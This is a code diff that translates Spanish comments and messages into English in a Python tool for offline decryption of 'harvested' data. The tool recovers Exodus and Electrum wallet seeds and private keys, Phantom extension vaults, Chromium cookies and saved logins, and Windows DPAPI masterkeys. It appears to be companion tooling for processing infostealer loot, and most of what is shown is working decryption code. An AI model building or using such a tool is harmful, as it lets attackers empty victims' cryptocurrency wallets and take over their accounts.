@@ -1,14 +1,14 @@
 #!/usr/bin/env python3
-"""Descifrado offline de lo que trae el harvest.
+"""Offline decryption of harvested data.
 
-Subcomandos:
-  exodus    <dir>        seed.seco/storage.seco (contenedor SECO v0)
-  electrum  <wallet>     wallet JSON de Electrum, con o sin contrasena
-  phantom   <dir>        chrome.storage.local de la extension Phantom
-  cookies   <Cookies>    SQLite de cookies/Login Data de Chromium (v10)
-  dpapi     ...          descifra un masterkey DPAPI del perfil
+Subcommands:
+  exodus    <dir>        seed.seco/storage.seco (SECO v0 container)
+  electrum  <wallet>     Electrum wallet JSON, with or without password
+  phantom   <dir>        chrome.storage.local from the Phantom extension
+  cookies   <Cookies>    Chromium cookies/Login Data SQLite (v10)
+  dpapi     ...          decrypt a profile DPAPI masterkey
 
-Dependencias: cryptography (obligatoria), plyvel (solo phantom).
+Dependencies: cryptography (required), plyvel (phantom only).
 """
 
 import argparse
@@ -58,14 +58,14 @@ def write_secret(path, data):
 def read_seco(path):
     data = open(path, "rb").read()
     if data[:4] != b"SECO":
-        raise ValueError("no es un contenedor SECO")
+        raise ValueError("not a SECO container")
     off = HEADER_SIZE + CHECKSUM_SIZE
     meta = data[off:off + METADATA_SIZE]
     off += METADATA_SIZE
     if len(meta) < METADATA_SIZE:
-        raise ValueError("metadata truncada")
+        raise ValueError("truncated metadata")
     if meta[SALT_SIZE + 12:SALT_SIZE + 12 + CIPHER_SIZE].rstrip(b"\0") != b"aes-256-gcm":
-        raise ValueError("cifrado no soportado")
+        raise ValueError("unsupported cipher")
     n, r, p = struct.unpack(">LLL", meta[SALT_SIZE:SALT_SIZE + 12])
     cur = SALT_SIZE + 12 + CIPHER_SIZE
     key_iv = meta[cur:cur + BLOB_KEY_IV_SIZE]
@@ -78,7 +78,7 @@ def read_seco(path):
     (size,) = struct.unpack(">L", data[off:off + 4])
     blob = data[off + 4:off + 4 + size]
     if len(blob) < size:
-        raise ValueError("blob truncado")
+        raise ValueError("truncated blob")
     return dict(salt=meta[:SALT_SIZE], n=n, r=r, p=p, key_iv=key_iv,
                 key_tag=key_tag, wrapped=wrapped, blob_iv=blob_iv,
                 blob_tag=blob_tag, blob=blob)
@@ -86,7 +86,7 @@ def read_seco(path):
 
 def seco_decrypt(container, passphrase):
     if len(passphrase) < 4:
-        raise ValueError("passphrase vacia")
+        raise ValueError("empty passphrase")
     kek = hashlib.scrypt(passphrase, salt=container["salt"], n=container["n"],
                          r=container["r"], p=container["p"], dklen=32,
                          maxmem=256 * container["n"] * container["r"] + (1 << 22))
@@ -107,7 +107,7 @@ def _zstd(data):
 
 
 def _inflate_all(data, start=0):
-    """Infla miembros gzip concatenados saltando el framing intermedio."""
+    """Inflate concatenated gzip members, skipping intermediate framing."""
     out = b""
     pos = start
     while True:
@@ -127,7 +127,7 @@ def _inflate_all(data, start=0):
 
 
 def _gzip_chunks(data):
-    """Stream de bloques: uint32 BE de longitud + gzip."""
+    """Block stream: uint32 BE length + gzip."""
     out = b""
     off = 0
     while off + 6 <= len(data):
@@ -145,7 +145,7 @@ def _gzip_chunks(data):
 
 
 def decode_payload(data):
-    """Devuelve texto JSON desde el blob, descomprimiendo o saltando cabecera."""
+    """Return JSON text from the blob, decompressing or skipping the header."""
     if data[4:6] == b"\x1f\x8b":
         chunks = _gzip_chunks(data)
         if chunks is not None:
@@ -192,19 +192,19 @@ def cmd_exodus(args):
         try:
             found = seco_decrypt(read_seco(seed), pw)
             chosen = pw
-            print(f"clave valida ({name}), scrypt n={read_seco(seed)['n']}")
+            print(f"valid key ({name}), scrypt n={read_seco(seed)['n']}")
             break
         except Exception:
             found = None
     if found is None:
-        sys.exit("la passphrase no abre el contenedor")
+        sys.exit("the passphrase does not open the container")
 
     write_secret("exodus_blob.bin", found)
     how, text = decode_payload(found)
     if how:
-        print(f"contenido: {how}")
+        print(f"content: {how}")
     else:
-        print(f"contenido binario, primeros bytes: {found[:48].hex(' ')}")
+        print(f"binary content, first bytes: {found[:48].hex(' ')}")
         print(found[:200].decode("utf-8", "replace"))
 
     try:
@@ -238,7 +238,7 @@ def cmd_electrum(args):
             if key in wallet:
                 print(f"{key}: {wallet[key]}")
         return
-    password = args.password or input("Contrasena de Electrum: ")
+    password = args.password or input("Electrum password: ")
     key = hashlib.sha256(password.encode()).digest()
     out = {}
     for field in ("seed", "xprv"):
@@ -254,7 +254,7 @@ def cmd_electrum(args):
 
 # --- dpapi ------------------------------------------------------------------
 
-# CALG -> (longitud de clave, hash, longitud de IV/bloque)
+# CALG -> (key length, hash, IV/block length)
 ALG = {
     0x660E: (16, "aes", 16),
     0x6610: (32, "aes", 16),
@@ -288,7 +288,7 @@ def derive(passphrase, salt, keylen, count, hash_name):
 
 
 class Blob:
-    """DPAPI_BLOB tal cual lo define Windows."""
+    """DPAPI_BLOB exactly as defined by Windows."""
 
     def __init__(self, data):
         self.raw = data
@@ -364,7 +364,7 @@ def masterkey_decrypt(path, password):
     stored = clear[16:16 + ALG[hash_alg][0]]
     mac_key = hmac.new(secret, clear[:16], hash_name).digest()
     if hmac.new(mac_key, key, hash_name).digest()[:ALG[hash_alg][0]] != stored:
-        raise ValueError("contrasena incorrecta o masterkey corrupto")
+        raise ValueError("wrong password or corrupt masterkey")
     return key
 
 
@@ -384,7 +384,7 @@ def load_key(args):
             for line in fh:
                 if line.startswith("v10="):
                     return bytes.fromhex(line[4:].strip().replace(":", ""))
-        sys.exit(f"sin linea v10= en {args.keys_file}")
+        sys.exit(f"no v10= line in {args.keys_file}")
     state = json.load(open(args.local_state))
     blob = Blob(base64.b64decode(state["os_crypt"]["encrypted_key"])[5:])
     if args.masterkey:
@@ -395,7 +395,7 @@ def load_key(args):
             base64.b64decode(state["os_crypt"]["encrypted_key"])[5:],
             None, None, None, 0)[1]
     except ImportError:
-        sys.exit("sin win32crypt: pasa --masterkey (hex) o --key (hex)")
+        sys.exit("no win32crypt: pass --masterkey (hex) or --key (hex)")
 
 
 # --- cookies ----------------------------------------------------------------
@@ -414,7 +414,7 @@ def cmd_cookies(args):
             elif enc[:3] == b"v20":
                 print(f"{host}\t{name}\t<v20 app-bound>")
             elif enc[:3] != b"v10":
-                print(f"{host}\t{name}\t<desconocido {enc[:3]!r}>")
+                print(f"{host}\t{name}\t<unknown {enc[:3]!r}>")
             else:
                 body = enc[3:]
                 print(f"{host}\t{name}\t"
@@ -439,13 +439,13 @@ def cmd_phantom(args):
     try:
         import plyvel
     except ImportError:
-        sys.exit("phantom necesita plyvel: pip install plyvel")
+        sys.exit("phantom needs plyvel: pip install plyvel")
     db = plyvel.DB(args.dir, create_if_missing=False)
     entries = {k: v for k, v in db}
     db.close()
 
     def chrome_unwrap(value):
-        # 1 byte de esquema + blob DPAPI/propio del perfil
+        # 1 scheme byte + DPAPI/profile-specific blob
         if value[:1] == b"\x01":
             blob = Blob(value[1:])
             return unprotect(blob, bytes.fromhex(args.masterkey))
@@ -461,7 +461,7 @@ def cmd_phantom(args):
         if name not in entries:
             continue
         vault = json.loads(chrome_unwrap(entries[name]))
-        print(f"{name.decode()}: salt/iteraciones {vault.get('iterations')} "
+        print(f"{name.decode()}: salt/iterations {vault.get('iterations')} "
               f"{vault.get('kdf')}")
         if not (args.password and vault.get("salt") and vault.get("nonce")):
             continue
@@ -496,19 +496,19 @@ def main():
     ph = sub.add_parser("phantom")
     ph.add_argument("dir")
     ph.add_argument("-p", "--password")
-    ph.add_argument("--masterkey", help="masterkey DPAPI en hex")
+    ph.add_argument("--masterkey", help="DPAPI masterkey in hex")
     ph.set_defaults(func=cmd_phantom)
 
     co = sub.add_parser("cookies")
     co.add_argument("db")
-    co.add_argument("--key", help="clave AES en hex")
-    co.add_argument("--keys-file", help="keys.txt del harvest (linea v10=)")
+    co.add_argument("--key", help="AES key in hex")
+    co.add_argument("--keys-file", help="harvest keys.txt (v10= line)")
     co.add_argument("--local-state")
-    co.add_argument("--masterkey", help="masterkey DPAPI en hex")
+    co.add_argument("--masterkey", help="DPAPI masterkey in hex")
     co.set_defaults(func=cmd_cookies)
 
     dp = sub.add_parser("dpapi")
-    dp.add_argument("file", help="fichero masterkey de Protect/<SID>/")
+    dp.add_argument("file", help="masterkey file from Protect/<SID>/")
     dp.add_argument("-p", "--password", required=True)
     dp.set_defaults(func=cmd_dpapi)
 
